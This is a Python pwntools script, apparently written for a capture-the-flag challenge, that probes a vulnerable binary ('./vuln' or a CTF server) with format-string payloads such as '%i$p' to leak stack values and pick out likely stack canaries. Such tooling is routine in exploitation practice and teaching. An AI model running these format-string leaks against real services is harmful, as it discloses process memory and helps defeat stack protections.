import sys
from pwn import *

global BINARY 

#=====[ Target Segment ]=====#
SERV = 'thpctf.th'
PORT = 6767
BINARY = './vuln' 
TOINDEX = 64
#============================#
elf = context.binary = ELF(BINARY)
# context.log_level = "error"  #aktifkan jika gamau liat info log
REMOTE = True

def start():
    global REMOTE
    if args.LOCAL or not REMOTE:
        p = process(BINARY,level='critical')
    else:
        try:
            p = remote(SERV,PORT)
        except Exception as e:
            REMOTE = False
            p = process(BINARY)
            log.warn("Cannot remote server...trying local.")
            
    return p


def indexl():
    main = hex(elf.sym.main)
    global TOINDEX

    payload = ''
    log = ''
    leaked = ''
    log += f'\n{text.red('='*50)}\n{'  TIPE':<15}{'INDEX':<20}{'ADDRESS'}\n{text.red('='*50)}'
    i = 0

    while True:
        i += 1
        pay = f"AAAABBBB%{i}$p:%{i+(TOINDEX//2)}$p"
        p = start()

            #===[ sendline segment 1 ]===#
        p.recvuntil(b': ')
        p.sendline(pay.encode())

            #===[ recvline segment 1 ]===#
        p.recvuntil(b'BBBB')
        try:
            rax = p.recvline().strip().decode().split(':')
            leak = int(rax[0],16)
            leak1 = int(rax[1],16)

            l_indx = f'index {i:<5}'
            l_val  = f'{hex(leak):<20}'
           
            r_indx = f'index {i+(TOINDEX//2):<5}'
            r_val  = f'{hex(leak1):<20}'
            
            l_side = f'{text.bold_green(l_indx)}{text.bold_yellow(l_val)}'
            r_side = f'{text.bold_green(r_indx)}{text.bold_yellow(r_val)}'

            leaked += f'\n{l_side} {'|':<10} {r_side}'

            for val,idx in ((leak, i) , (leak1, i + (TOINDEX//2))):
                log_entry , payload_entry = filtering(val,idx)
                if log_entry:
                    log += log_entry 
                if payload_entry:
                    payload += payload_entry
            
            #leaked += f'\n{text.green(f'index {i :<5}')} : {text.bold_yellow(hex(leak))} {'':<15}{'|':<15} {text.green(f'index {i+(TOINDEX//2) :<5}')} : {text.bold_yellow(hex(leak1))}'

            # leak = str(hex(leak))

        except:
            p.close()
    
        if i == (TOINDEX//2):
            break
    
        p.close()

    log += f'\n{text.red('='*50)}'
    log += f'\n{text.bold_green("FORMAT STRING PAYLOAD  :")}'
    log += f'\n{text.bold_yellow(payload)}'
    log += f'\n{text.bold_red('='*50)}'
    print(leaked)
    print(log)

def filtering(leak,i):
    log_entry = ""
    payload_entry = ""

    leak_hex = hex(leak)

    #==========[ CANARY ]==========#
    if leak_hex.endswith('00') and len(leak_hex) >= 16:
        log_entry += f"\n{'':<2}{text.red('canary'):<23}{i:<15}{text.bold_yellow(leak_hex)}"
        payload_entry += f'%{i}$p.'

    print(repr(leak_hex), len(leak_hex))
    return log_entry,payload_entry

def main():
    p = log.progress('See Index Tools')
    p.status("indexing")
    indexl()
    start()


if __name__ == "__main__":
    main()
